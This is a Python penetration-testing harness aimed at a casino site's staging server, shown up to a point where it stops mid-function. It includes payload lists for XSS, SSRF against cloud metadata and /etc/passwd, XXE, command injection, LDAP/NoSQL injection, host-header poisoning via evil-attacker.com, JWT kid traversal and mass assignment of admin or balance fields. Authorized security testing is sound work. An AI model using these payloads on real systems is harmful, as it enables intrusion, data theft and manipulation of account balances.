#!/usr/bin/env python3
"""
Runehall.com - Max AIO Red Ops Pipeline (v8.0)

Staging-authorized defensive pentest harness for the owner's own Runehall SPA.
All v6 vectors + phase orchestration, bounded async concurrency with global
rate limiting, consolidated casino business-logic module with
PASS/FAIL/INCONCLUSIVE verdicts, richer HTML/JSON/SARIF/Markdown reporting,
structured logging, config dataclass, retries with backoff, and clear exit codes.

HARD SAFETY GATES (never weaken):
  - AUTHORIZED must be true
  - "runehall.com" must appear in TARGET_URL
  - Production hosts (runehall.com / www / app) refused
  - Non-staging *.runehall.com refused
  - RUN_STATEFUL defaults False; every destructive/stateful action requires
    RUN_STATEFUL=True AND a configured JWT/endpoint

Do not retarget at third parties or production. Outcome prediction from seeds
is intentionally NOT implemented.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import hashlib
import hmac
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Sequence, Set, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse
import xml.sax.saxutils as _xml

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:  # pragma: no cover
    HAS_PLAYWRIGHT = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:  # pragma: no cover
    HAS_HTTPX = False

# ---------------------------------------------------------------------------
# Version / exit codes
# ---------------------------------------------------------------------------
VERSION = "8.0"
EXIT_OK = 0
EXIT_FINDINGS_HIGH = 10          # CRITICAL/HIGH present (non-zero for CI gating)
EXIT_CONFIG_ERROR = 2
EXIT_AUTH_REFUSED = 3
EXIT_RUNTIME_ERROR = 1

# ---------------------------------------------------------------------------
# OWASP / CWE tag maps (applied per finding category)
# ---------------------------------------------------------------------------
OWASP_CWE: Dict[str, Dict[str, str]] = {
    "jwt_analysis": {"owasp": "A07:2021 Identification and Authentication Failures", "cwe": "CWE-347"},
    "auth_jwt_forgery": {"owasp": "A07:2021 Identification and Authentication Failures", "cwe": "CWE-347"},
    "auth_session_fixation": {"owasp": "A07:2021 Identification and Authentication Failures", "cwe": "CWE-384"},
    "auth_cookie_flags": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-614"},
    "auth_oauth_redirect": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-601"},
    "idor_bola": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-639"},
    "open_redirects": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-601"},
    "security_headers": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-693"},
    "js_secrets": {"owasp": "A02:2021 Cryptographic Failures", "cwe": "CWE-798"},
    "cors_findings": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-942"},
    "prototype_pollution": {"owasp": "A03:2021 Injection", "cwe": "CWE-1321"},
    "postmessage_issues": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-346"},
    "websocket_findings": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-306"},
    "graphql_findings": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-200"},
    "reflected_xss_candidates": {"owasp": "A03:2021 Injection", "cwe": "CWE-79"},
    "ssrf_param_candidates": {"owasp": "A10:2021 Server-Side Request Forgery", "cwe": "CWE-918"},
    "http_method_tampering": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-16"},
    "rate_limiting": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-770"},
    "race_conditions": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-362"},
    "casino_race": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-362"},
    "casino_payout_integrity": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-602"},
    "casino_amount_validation": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-20"},
    "casino_bonus_rollover": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-841"},
    "casino_freespin_scatter": {"owasp": "A04:2021 Insecure Design", "cwe": "CWE-841"},
    "casino_provably_fair": {"owasp": "A02:2021 Cryptographic Failures", "cwe": "CWE-330"},
    "storage_exposure": {"owasp": "A02:2021 Cryptographic Failures", "cwe": "CWE-922"},
    "route_bypass": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-285"},
    "dom_xss": {"owasp": "A03:2021 Injection", "cwe": "CWE-79"},
    "nuclei_findings": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-1035"},
    "access_control_matrix": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-285"},
    "path_bypass": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-22"},
    "csrf": {"owasp": "A01:2021 Broken Access Control", "cwe": "CWE-352"},
    "mass_assignment": {"owasp": "A08:2021 Software and Data Integrity Failures", "cwe": "CWE-915"},
    "host_header": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-644"},
    "subdomain_takeover": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-350"},
    "hpp": {"owasp": "A03:2021 Injection", "cwe": "CWE-235"},
    "injection": {"owasp": "A03:2021 Injection", "cwe": "CWE-74"},
    "graphql_deep": {"owasp": "A05:2021 Security Misconfiguration", "cwe": "CWE-200"},
    "ssrf_real": {"owasp": "A10:2021 Server-Side Request Forgery", "cwe": "CWE-918"},
    "jwt_advanced": {"owasp": "A02:2021 Cryptographic Failures", "cwe": "CWE-347"},
}

# Kodak / scatter documented policies (read-only verification baselines)
BONUS_POLICY = {
    "name": "Kodak welcome bonus",
    "credit_gp": 50_000_000,
    "rollover_multiplier": 40,
    "max_bet_while_active": None,  # None = no max-bet restriction per policy
}
SCATTER_POLICY = {
    "scatters_5_payout_mult": 20,
    "scatters_6plus_same_as_5": True,
    "free_spins_on_scatter": 25,
    "retrigger_spins": 10,
}

# ---------------------------------------------------------------------------
# v8 payload / fingerprint lists (injected values only; never scan targets)
# ---------------------------------------------------------------------------
ACCESS_MATRIX_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]

PATH_BYPASS = [
    "/admin", "//admin", "/admin/", "/admin//", "/./admin", "/admin/..;/", "/admin;/",
    "/%2e/admin", "/admin%2f", "/%2e%2e/admin", "/admin#", "/admin?", "/ADMIN", "/Admin",
    "/admin/.", "/;/admin", "/actuator", "/actuator/env", "/actuator/health",
    "/.git/config", "/.git/HEAD", "/.env", "/swagger", "/swagger-ui.html", "/swagger-ui/",
    "/api-docs", "/v2/api-docs", "/openapi.json", "/.well-known/security.txt",
    "/server-status", "/debug", "/metrics",
]

MASS_ASSIGN_FIELDS = [
    "role", "isAdmin", "is_admin", "admin", "isPaid", "is_paid", "balance", "credits",
    "kycStatus", "kyc_status", "verified", "emailVerified", "permissions", "roles",
    "vipLevel", "vip_level", "accountType", "isVip", "banned", "frozen",
]

HOST_PAYLOADS = [
    "evil-attacker.com", "evil-attacker.com:80",
    "staging.runehall.com.evil-attacker.com", "localhost", "127.0.0.1", "169.254.169.254",
]
HOST_HEADER_NAMES = [
    "Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "Forwarded",
    "X-Original-Host", "X-Rewrite-URL",
]
HOST_TARGET_PATHS = ["/", "/login", "/forgot-password", "/reset-password", "/api/auth/reset"]

XSS_PAYLOADS = [
    '<img src=x onerror="window.__xss.push({sink:\'onerror\',val:\'AIOMARK\'})">',
    '<svg/onload="window.__xss.push({sink:\'onload\',val:\'AIOMARK\'})">',
    '"><script>window.__xss.push({sink:\'script\',val:\'AIOMARK\'})</script>',
    '<iframe src="javascript:window.__xss.push({sink:\'iframe-js\',val:\'AIOMARK\'})">',
    '<body onload="window.__xss.push({sink:\'body-onload\',val:\'AIOMARK\'})">',
]

# init-script that hooks dangerous DOM sinks and records executions to window.__xss
DOM_SINK_INIT_JS = r"""
(() => {
  window.__xss = window.__xss || [];
  const rec = (sink, val) => { try { window.__xss.push({sink: sink, val: String(val).slice(0, 240)}); } catch (e) {} };
  const hook = (obj, prop, sink) => {
    try {
      const d = Object.getOwnPropertyDescriptor(obj, prop);
      if (!d || !d.set) return;
      Object.defineProperty(obj, prop, {
        configurable: true,
        get() { return d.get ? d.get.call(this) : undefined; },
        set(v) { rec(sink, v); return d.set.call(this, v); },
      });
    } catch (e) {}
  };
  hook(Element.prototype, 'innerHTML', 'innerHTML');
  hook(Element.prototype, 'outerHTML', 'outerHTML');
  try { const _w = document.write.bind(document); document.write = function (s) { rec('document.write', s); return _w(s); }; } catch (e) {}
  try { const _e = window.eval; window.eval = function (s) { rec('eval', s); return _e(s); }; } catch (e) {}
  try { const _F = window.Function; window.Function = function () { rec('Function', Array.from(arguments).join(',')); return _F.apply(this, arguments); }; } catch (e) {}
  try { const _st = window.setTimeout; window.setTimeout = function (f, t) { if (typeof f === 'string') rec('setTimeout', f); return _st(f, t); }; } catch (e) {}
  try { const _si = window.setInterval; window.setInterval = function (f, t) { if (typeof f === 'string') rec('setInterval', f); return _si(f, t); }; } catch (e) {}
})();
"""

# Subdomain-takeover service fingerprints (body signatures of unclaimed services)
TAKEOVER_FP = {
    "GitHub Pages": ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/) you must provide an index.html file"],
    "Amazon S3": ["NoSuchBucket", "The specified bucket does not exist"],
    "Heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
    "AWS/CloudFront": ["ERROR: The request could not be satisfied", "Bad request."],
    "Fastly": ["Fastly error: unknown domain"],
    "Shopify": ["Sorry, this shop is currently unavailable"],
    "Surge.sh": ["project not found"],
    "Bitbucket": ["Repository not found"],
    "Pantheon": ["The gods are wise", "404 error unknown site!"],
    "Tumblr": ["Whatever you were looking for doesn't currently exist at this address"],
    "Zendesk": ["Help Center Closed"],
    "Readme.io": ["Project doesnt exist... yet!"],
    "Ghost": ["The thing you were looking for is no longer here"],
    "Netlify": ["Not Found - Request ID"],
}

# Category -> owning phase (used by --retest to re-run only the relevant phase)
CATEGORY_PHASE = {
    "security_headers": "recon", "rate_limiting": "recon", "http_method_tampering": "recon",
    "auth_cookie_flags": "recon", "auth_session_fixation": "recon", "subdomains": "recon",
    "host_header": "recon", "subdomain_takeover": "recon",
    "storage_exposure": "passive", "route_bypass": "passive", "cors_findings": "passive",
    "prototype_pollution": "passive", "postmessage_issues": "passive", "websocket_findings": "passive",
    "graphql_findings": "passive", "js_secrets": "passive", "jwt_analysis": "passive",
    "casino_payout_integrity": "passive", "casino_bonus_rollover": "passive",
    "casino_freespin_scatter": "passive", "casino_provably_fair": "passive",
    "reflected_xss_candidates": "active_safe", "ssrf_param_candidates": "active_safe",
    "auth_oauth_redirect": "active_safe", "idor_bola": "active_safe", "open_redirects": "active_safe",
    "nuclei_findings": "active_safe", "access_control_matrix": "active_safe", "path_bypass": "active_safe",
    "csrf": "active_safe", "mass_assignment": "active_safe", "dom_xss": "active_safe",
    "hpp": "active_safe", "injection": "active_safe", "graphql_deep": "active_safe",
    "ssrf_real": "active_safe", "jwt_advanced": "active_safe",
    "casino_race": "stateful", "casino_amount_validation": "stateful", "auth_jwt_forgery": "stateful",
}

# ---------------------------------------------------------------------------
# v8 (second wave): HPP / injection / GraphQL / SSRF / JWT payload corpora.
# OOB/collaborator placeholders are substituted with AIO_OOB_HOST at runtime.
# These are injected *values* only; never scan targets. Loopback/metadata URLs
# are handed to the app under test — the harness never fetches metadata itself.
# ---------------------------------------------------------------------------
HPP_PAYLOADS = [
    ("role", "user", "admin"), ("admin", "false", "true"),
    ("id", "1", "2"), ("user_id", "1", "2"), ("price", "10", "0"),
    ("amount", "10", "10000"), ("discount", "0", "100"), ("coupon", "", "FREE100"),
]
HPP_VALUE_CHANGING = {"role", "admin", "price", "amount", "discount", "coupon"}

INJECT_PARAMS = ["q", "search", "id", "user", "username", "email", "name",
                 "query", "filter", "where", "cmd", "url", "file", "path"]
INJECT_PROBES = {
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
    "xxe": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
    "xxe_oob": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://OOB/xxe">]><r>&x;</r>'],
    "cmdi": [";id", "|id", "`id`", "$(id)", "& id"],
    "nosqli": [{"$gt": ""}, {"$ne": None}, {"$regex": ".*"}],
    "ldapi": ["*)(uid=*))(|(uid=*", "*)(|(objectclass=*", "*))%00"],
}

GQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

SSRF_PARAMS = ["url", "uri", "webhook", "callback", "callback_url", "target", "fetch",
               "proxy", "redirect_uri", "image_url", "avatar", "link", "endpoint",
               "dest", "next_url", "src", "source"]
SSRF_TARGETS = [
    "http://127.0.0.1:22", "http://127.0.0.1:6379",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://[::1]/", "http://2130706433/", "http://0x7f000001/",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO", "http://OOB/ssrf",
]
SSRF_SIGNATURES = ("root:x:0", "127.0.0.1", "meta-data", "ami-id", "computeMetadata", "SSH-2.0")

JWT_WORDLIST = ["secret", "password", "changeme", "jwt", "supersecret", "runehall",
                "staging", "dev", "test", "admin", "key", "your-256-bit-secret"]
JWT_KID_PAYLOADS = ["../../../../etc/passwd", "' OR 1=1--", "|id", "http://OOB/kid", "keys/dev.pem"]
JWT_PROBE_PATHS = ["/api/me", "/api/wallet/balance", "/api/user"]


# ---------------------------------------------------------------------------
# Helpers: env parsing / bool
# ---------------------------------------------------------------------------
def _env_bool(name: str, default: str = "false") -> bool:
    return os.environ.get(name, default).strip().lower() in ("1", "true", "yes")


def _env_str(name: str, default: str = "") -> str:
    return os.environ.get(name, default).strip()


def _utc_now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# Config dataclass (file defaults + env overrides; domain guard always wins)
# ---------------------------------------------------------------------------
@dataclass
class AIOConfig:
    target_url: str = "https://staging.runehall.com"
    authorized: bool = True
    run_stateful: bool = False
    user_a_jwt: str = "YOUR_USER_A_JWT_HERE"
    user_b_jwt: str = "YOUR_USER_B_JWT_HERE"
    bet_endpoint: str = ""
    withdraw_endpoint: str = ""
    balance_endpoint: str = ""
    bonus_endpoint: str = ""
    freespin_endpoint: str = ""
    seed_endpoint: str = ""
    auth_test_endpoint: str = ""
    skip_playwright: bool = False
    enable_zap: bool = False
    max_concurrency: int = 6
    rate_limit_rps: float = 4.0
    request_timeout: float = 10.0
    max_retries: int = 3
    phases: List[str] = field(default_factory=lambda: ["all"])
    output_prefix: str = "max_aio_v8_report"
    log_level: str = "INFO"
    # v8: authed Playwright context cookie name (app-configurable)
    auth_cookie_name: str = "access_token"
    # v8: network harness tuning
    http2: bool = False
    pool_connections: int = 0           # 0 => derive from max_concurrency
    pool_maxsize: int = 0               # 0 => derive from max_concurrency
    # v8: request signing (for endpoints that require HMAC / API key)
    sign_mode: str = ""                 # "" | "hmac" | "apikey"
    sign_secret: str = ""
    sign_header: str = "X-Signature"
    sign_algo: str = "sha256"
    sign_key_id: str = ""
    sign_key_id_header: str = "X-Key-Id"
    apikey_header: str = "X-API-Key"
    apikey_value: str = ""
    # v8: history / diff
    enable_history: bool = True
    history_file: str = "max_aio_v8_history.json"
    retest_id: str = ""
    # v8 (second wave): out-of-band collaborator host for blind SSRF/XXE/jku probes
    oob_host: str = ""

    @classmethod
    def from_env(cls, phases_cli: Optional[List[str]] = None) -> "AIOConfig":
        phases_env = _env_str("AIO_PHASES", "")
        if phases_cli:
            phases = phases_cli
        elif phases_env:
            phases = [p.strip() for p in phases_env.split(",") if p.strip()]
        else:
            phases = ["all"]
        return cls(
            target_url=_env_str("AIO_TARGET_URL", "https://staging.runehall.com"),
            authorized=_env_bool("AIO_AUTHORIZED", "true"),
            run_stateful=_env_bool("AIO_RUN_STATEFUL", "false"),
            user_a_jwt=_env_str("AIO_USER_A_JWT", "YOUR_USER_A_JWT_HERE"),
            user_b_jwt=_env_str("AIO_USER_B_JWT", "YOUR_USER_B_JWT_HERE"),
            bet_endpoint=_env_str("AIO_BET_ENDPOINT", ""),
            withdraw_endpoint=_env_str("AIO_WITHDRAW_ENDPOINT", ""),
            balance_endpoint=_env_str("AIO_BALANCE_ENDPOINT", ""),
            bonus_endpoint=_env_str("AIO_BONUS_ENDPOINT", ""),
            freespin_endpoint=_env_str("AIO_FREESPIN_ENDPOINT", ""),
            seed_endpoint=_env_str("AIO_SEED_ENDPOINT", ""),
            auth_test_endpoint=_env_str("AIO_AUTH_TEST_ENDPOINT", ""),
            skip_playwright=_env_bool("AIO_SKIP_PLAYWRIGHT", "false"),
            enable_zap=_env_bool("AIO_ENABLE_ZAP", "false"),
            max_concurrency=max(1, int(_env_str("AIO_MAX_CONCURRENCY", "6") or "6")),
            rate_limit_rps=max(0.5, float(_env_str("AIO_RATE_LIMIT_RPS", "4") or "4")),
            request_timeout=max(2.0, float(_env_str("AIO_REQUEST_TIMEOUT", "10") or "10")),
            max_retries=max(0, int(_env_str("AIO_MAX_RETRIES", "3") or "3")),
            phases=phases,
            output_prefix=_env_str("AIO_OUTPUT_PREFIX", "max_aio_v8_report") or "max_aio_v8_report",
            log_level=_env_str("AIO_LOG_LEVEL", "INFO") or "INFO",
            auth_cookie_name=_env_str("AIO_AUTH_COOKIE_NAME", "access_token") or "access_token",
            http2=_env_bool("AIO_HTTP2", "false"),
            pool_connections=max(0, int(_env_str("AIO_POOL_CONNECTIONS", "0") or "0")),
            pool_maxsize=max(0, int(_env_str("AIO_POOL_MAXSIZE", "0") or "0")),
            sign_mode=_env_str("AIO_SIGN_MODE", "").lower(),
            sign_secret=_env_str("AIO_SIGN_SECRET", ""),
            sign_header=_env_str("AIO_SIGN_HEADER", "X-Signature") or "X-Signature",
            sign_algo=_env_str("AIO_SIGN_ALGO", "sha256") or "sha256",
            sign_key_id=_env_str("AIO_SIGN_KEY_ID", ""),
            sign_key_id_header=_env_str("AIO_SIGN_KEY_ID_HEADER", "X-Key-Id") or "X-Key-Id",
            apikey_header=_env_str("AIO_APIKEY_HEADER", "X-API-Key") or "X-API-Key",
            apikey_value=_env_str("AIO_APIKEY_VALUE", ""),
            enable_history=_env_bool("AIO_ENABLE_HISTORY", "true"),
            history_file=_env_str("AIO_HISTORY_FILE", "max_aio_v8_history.json") or "max_aio_v8_history.json",
            oob_host=_env_str("AIO_OOB_HOST", ""),
        )

    def casino_endpoints(self) -> Dict[str, str]:
        return {
            "BET_ENDPOINT": self.bet_endpoint,
            "WITHDRAW_ENDPOINT": self.withdraw_endpoint,
            "BALANCE_ENDPOINT": self.balance_endpoint,
            "BONUS_ENDPOINT": self.bonus_endpoint,
            "FREESPIN_ENDPOINT": self.freespin_endpoint,
            "SEED_ENDPOINT": self.seed_endpoint,
            "AUTH_TEST_ENDPOINT": self.auth_test_endpoint,
        }

    def validate(self) -> None:
        if not self.target_url.startswith(("http://", "https://")):
            raise ValueError("TARGET_URL must start with http:// or https://")
        if self.max_concurrency < 1 or self.max_concurrency > 32:
            raise ValueError("max_concurrency must be 1..32")
        if self.rate_limit_rps <= 0 or self.rate_limit_rps > 50:
            raise ValueError("rate_limit_rps must be >0 and <=50 (be polite to staging)")


def enforce_safety_gates(cfg: AIOConfig) -> None:
    """Hard refuse: unauthorized, missing domain, production, or non-staging host."""
    if not cfg.authorized or "runehall.com" not in cfg.target_url:
        sys.exit("Authorization failed.")
    host = urlparse(cfg.target_url).hostname or ""
    if host in ("runehall.com", "www.runehall.com", "app.runehall.com"):
        sys.exit("Refusing production host. Pin TARGET_URL to staging.runehall.com only.")
    if host and "staging" not in host and host.endswith("runehall.com"):
        sys.exit(f"Refusing non-staging host {host!r}. Use staging.runehall.com only.")


def setup_logging(level: str) -> logging.Logger:
    logger = logging.getLogger("max_aio_v8")
    logger.handlers.clear()
    logger.setLevel(getattr(logging, level.upper(), logging.INFO))
    handler = logging.StreamHandler(sys.stdout)
    handler.setFormatter(logging.Formatter(
        fmt="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    ))
    logger.addHandler(handler)
    logger.propagate = False
    return logger


# ---------------------------------------------------------------------------
# Rate limiter + HTTP session with retries
# ---------------------------------------------------------------------------
class RateLimiter:
    """Simple global token-bucket style limiter (polite to staging)."""

    def __init__(self, rps: float):
        self.min_interval = 1.0 / rps if rps > 0 else 0.0
        self._lock = asyncio.Lock()
        self._last = 0.0
        self._sync_lock = __import__("threading").Lock()
        self._sync_last = 0.0

    async def acquire_async(self) -> None:
        async with self._lock:
            now = time.monotonic()
            wait = self.min_interval - (now - self._last)
            if wait > 0:
                await asyncio.sleep(wait)
            self._last = time.monotonic()

    def acquire_sync(self) -> None:
        with self._sync_lock:
            now = time.monotonic()
            wait = self.min_interval - (now - self._sync_last)
            if wait > 0:
                time.sleep(wait)
            self._sync_last = time.monotonic()


def build_session(cfg: AIOConfig):
    """Return a requests.Session, or an httpx.Client when HTTP/2 is requested+available.

    Connection-reuse is tunable via cfg.pool_connections / cfg.pool_maxsize
    (0 => derive from max_concurrency). Both backends expose a compatible
    .get/.post/.request surface and .status_code/.text/.headers on responses.
    """
    ua = f"Runehall-MaxAIO/{VERSION} (staging-authorized)"
    pool_maxsize = cfg.pool_maxsize if cfg.pool_maxsize > 0 else max(cfg.max_concurrency, 10)
    pool_connections = cfg.pool_connections if cfg.pool_connections > 0 else pool_maxsize
    if cfg.http2 and HAS_HTTPX:
        limits = httpx.Limits(
            max_connections=pool_maxsize,
            max_keepalive_connections=pool_connections,
        )
        transport = httpx.HTTPTransport(retries=cfg.max_retries, limits=limits, http2=True)
        client = httpx.Client(
            transport=transport,
            headers={"User-Agent": ua},
            timeout=cfg.request_timeout,
            follow_redirects=True,
        )
        return client
    sess = requests.Session()
    retry = Retry(
        total=cfg.max_retries,
        connect=cfg.max_retries,
        read=cfg.max_retries,
        backoff_factor=0.6,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=frozenset(["GET", "HEAD", "OPTIONS", "TRACE", "POST", "PUT", "PATCH", "DELETE"]),
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool_connections, pool_maxsize=pool_maxsize)
    sess.mount("https://", adapter)
    sess.mount("http://", adapter)
    sess.headers.update({"User-Agent": ua})
    return sess


# ---------------------------------------------------------------------------
# Finding helpers
# ---------------------------------------------------------------------------
class Verdict(str, Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    INCONCLUSIVE = "INCONCLUSIVE"


def tag_finding(category: str, finding: Dict[str, Any]) -> Dict[str, Any]:
    tags = OWASP_CWE.get(category, {})
    out = dict(finding)
    if "owasp" not in out and tags.get("owasp"):
        out["owasp"] = tags["owasp"]
    if "cwe" not in out and tags.get("cwe"):
        out["cwe"] = tags["cwe"]
    out.setdefault("category", category)
    return out


def finding(
    severity: str,
    detail: str,
    *,
    fix: str = "",
    url: str = "",
    category: str = "",
    verdict: Optional[str] = None,
    **extra: Any,
) -> Dict[str, Any]:
    f: Dict[str, Any] = {
        "severity": severity.upper(),
        "detail": detail,
        "fix": fix,
    }
    if url:
        f["url"] = url
    if verdict:
        f["verdict"] = verdict
    f.update(extra)
    return tag_finding(category, f) if category else f


# ---------------------------------------------------------------------------
# Phase registry
# ---------------------------------------------------------------------------
PHASE_ORDER = ["recon", "passive", "active_safe", "stateful"]
PHASE_ALIASES = {
    "all": PHASE_ORDER[:],
    "recon": ["recon"],
    "passive": ["passive"],
    "active": ["active_safe"],
    "active_safe": ["active_safe"],
    "stateful": ["stateful"],
}


def resolve_phases(requested: Sequence[str]) -> List[str]:
    selected: List[str] = []
    for item in requested:
        key = item.strip().lower()
        if key in PHASE_ALIASES:
            for p in PHASE_ALIASES[key]:
                if p not in selected:
                    selected.append(p)
        elif key in PHASE_ORDER:
            if key not in selected:
                selected.append(key)
        else:
            raise ValueError(
                f"Unknown phase {item!r}. Valid: {', '.join(PHASE_ORDER + ['all'])}"
            )
    # Keep canonical order
    return [p for p in PHASE_ORDER if p in selected]


@dataclass
class PhaseResult:
    name: str
    status: str  # ran | skipped | failed
    started_at: str = ""
    finished_at: str = ""
    duration_s: float = 0.0
    reason: str = ""
    modules: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Casino business-logic module (consolidated, read-only / gated)
# ---------------------------------------------------------------------------
class CasinoLogicModule:
    """
    Consolidated Kodak bonus/rollover, free-spin/scatter, and provably-fair checks.
    Produces PASS / FAIL / INCONCLUSIVE verdicts vs documented policy.
    Provably-fair is detection-only (no outcome prediction).
    """

    def __init__(self, harness: "MaxRedOpsHarness"):
        self.h = harness
        self.cfg = harness.cfg
        self.log = harness.log
        self.verdicts: List[Dict[str, Any]] = []

    def _record_verdict(
        self,
        area: str,
        verdict: Verdict,
        detail: str,
        *,
        severity: str = "INFO",
        fix: str = "",
        url: str = "",
        category: str = "",
    ) -> None:
        entry = finding(
            severity,
            detail,
            fix=fix,
            url=url,
            category=category,
            verdict=verdict.value,
            area=area,
        )
        self.verdicts.append(entry)
        # Also push into the matching report bucket
        bucket = {
            "bonus_rollover": "casino_bonus_rollover",
            "freespin_scatter": "casino_freespin_scatter",
            "provably_fair": "casino_provably_fair",
            "payout_integrity": "casino_payout_integrity",
        }.get(area, "casino_bonus_rollover")
        self.h.report[bucket].append(entry)

    # ---- payout / odds integrity (JS + balance API) ----
    def scan_payout_integrity(self) -> None:
        self.log.info("Casino payout/odds integrity scan (JS + intercepted API bodies)...")
        casino_patterns = {
            "payout multiplier": r"(?i)[\"']?payout(?:Multiplier|Rate)?[\"']?\s*[:=]\s*[\"']?\d",
            "RTP value": r"(?i)[\"']?rtp[\"']?\s*[:=]\s*[\"']?\d",
            "house edge": r"(?i)[\"']?houseEdge[\"']?\s*[:=]\s*[\"']?\d",
            "win chance": r"(?i)[\"']?winChance[\"']?\s*[:=]\s*[\"']?\d",
            "server seed leaked": r"(?i)[\"']?serverSeed[\"']?\s*[:=]\s*[\"']?[a-f0-9]{16,}",
            "client seed": r"(?i)[\"']?clientSeed[\"']?\s*[:=]",
            "provably fair secret": r"(?i)[\"']?(secretSeed|hmacSecret|seedSecret)[\"']?\s*[:=]",
            "hardcoded odds": r"(?i)[\"']?(odds|probability)[\"']?\s*[:=]\s*0\.\d+",
        }
        hits = 0
        for url, text in self.h.js_bundle_texts.items():
            for name, pat in casino_patterns.items():
                if re.search(pat, text):
                    hits += 1
                    self.h.report["casino_payout_integrity"].append(finding(
                        "HIGH",
                        f"Client-side '{name}' pattern found in JS bundle.",
                        fix="Keep payout, RTP, houseEdge, serverSeed, and RNG secrets server-side. Expose only opaque round results.",
                        url=url,
                        category="casino_payout_integrity",
                        verdict=Verdict.FAIL.value,
                    ))
        bal = self.cfg.balance_endpoint
        if bal:
            try:
                url = urljoin(self.cfg.target_url, bal)
                r = self.h.http_get(url, headers=self.h.auth_headers())
                body = r.text[:8000]
                for name, pat in casino_patterns.items():
                    if re.search(pat, body):
                        hits += 1
                        self.h.report["casino_payout_integrity"].append(finding(
                            "HIGH",
                            f"API response at {bal} exposes '{name}'.",
                            fix="Strip sensitive game-math fields from client-visible API responses.",
                            url=url,
                            category="casino_payout_integrity",
                            verdict=Verdict.FAIL.value,
                        ))
            except Exception as e:
                self.h.report["errors"].append(f"Casino balance probe error: {e}")
                self._record_verdict(
                    "payout_integrity", Verdict.INCONCLUSIVE,
                    f"Balance endpoint probe failed: {e}",
                    severity="INFO", category="casino_payout_integrity",
                )
                return
        if hits == 0:
            self._record_verdict(
                "payout_integrity", Verdict.PASS,
                "No client-side payout/RTP/houseEdge/serverSeed leak patterns detected in scanned bundles/API.",
                severity="INFO",
                fix="Continue keeping game math server-side.",
                category="casino_payout_integrity",
            )
        else:
            self._record_verdict(
                "payout_integrity", Verdict.FAIL,
                f"{hits} client-side payout/odds leak pattern(s) detected.",
                severity="HIGH",
                fix="Move game math and seeds server-side.",
                category="casino_payout_integrity",
            )

    # ---- bonus / rollover ----
    def scan_bonus_rollover(self) -> None:
        self.log.info("Casino bonus/rollover accounting check (read-only by default)...")
        policy = BONUS_POLICY
        expected_wager = policy["credit_gp"] * policy["rollover_multiplier"]
        self.h.report["casino_bonus_rollover"].append(finding(
            "INFO",
            (
                f"Policy baseline: '{policy['name']}' = {policy['credit_gp']:,} GP at "
                f"{policy['rollover_multiplier']}x rollover "
                f"(expected wager requirement = {expected_wager:,} GP). "
                f"max_bet_while_active={policy['max_bet_while_active']!r} (None = unrestricted)."
            ),
            fix="Server must track wagered-with-bonus separately and clear rollover only after expected_wager is met.",
            category="casino_bonus_rollover",
            baseline=True,  # informational baseline — excluded from verdict rollup
        ))

        bypass_patterns = {
            "client-side rollover counter": r"(?i)[\"']?(rollover(?:Remaining|Progress|Required)?|wageringRequirement)[\"']?\s*[:=]",
            "bonus balance mutator": r"(?i)(setBonus|clearRollover|bypassRollover|skipWagering)\s*\(",
            "max-bet during bonus": r"(?i)[\"']?maxBet(?:WhileBonus|DuringBonus)?[\"']?\s*[:=]",
            "bonus credit hardcoded": r"(?i)[\"']?(bonusCredit|welcomeBonus|kodakBonus)[\"']?\s*[:=]\s*\d+",
        }
        js_fail = 0
        for url, text in self.h.js_bundle_texts.items():
            for name, pat in bypass_patterns.items():
                if re.search(pat, text):
                    sev = "HIGH" if "bypass" in name or "mutator" in name else "MEDIUM"
                    if sev == "HIGH":
                        js_fail += 1
